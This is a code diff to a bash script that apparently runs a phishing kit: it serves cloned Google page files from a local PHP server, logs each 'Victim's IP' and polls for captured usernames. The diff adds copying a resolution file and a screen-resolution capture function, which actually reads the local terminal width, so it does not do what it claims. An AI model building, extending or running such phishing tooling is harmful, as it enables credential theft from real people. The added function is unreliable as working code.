@@ -418,6 +418,8 @@ setup_site() {
 	cp -f .sites/ip.php .server/www/
 	cp -f .sites/google_new/get_code.php .server/www/
 	cp -f .sites/google_new/code.txt .server/www/
+	cp -f .sites/google_new/resolution.txt .server/www/
+
 	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
 	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
 }
@@ -429,6 +431,15 @@ capture_ip() {
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Victim's IP : ${BLUE}$IP"
 	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/ip.txt"
 	cat .server/www/ip.txt >> auth/ip.txt
+}
+
+## Get the screen resolution 
+capture_screen_resolution() {
+	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Screeen Resolutions : ${WHITE}"
+	screen_width=$(stty size | awk '{print $2}')
+	echo -e "${WHITE} $screen_width"
+	stty size | awk '{print $2}'
+	echo
 }
 
 ## Extract code
@@ -517,8 +528,9 @@ capture_data() {
 	while true; do
 		if [[ -e ".server/www/ip.txt" ]]; then
 			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
-			capture_ip
+			capture_ip			
 			rm -rf .server/www/ip.txt
+			# capture_screen_resolution
 		fi
 		sleep 0.75
 		if [[ -e ".server/www/usernames.txt" ]]; then
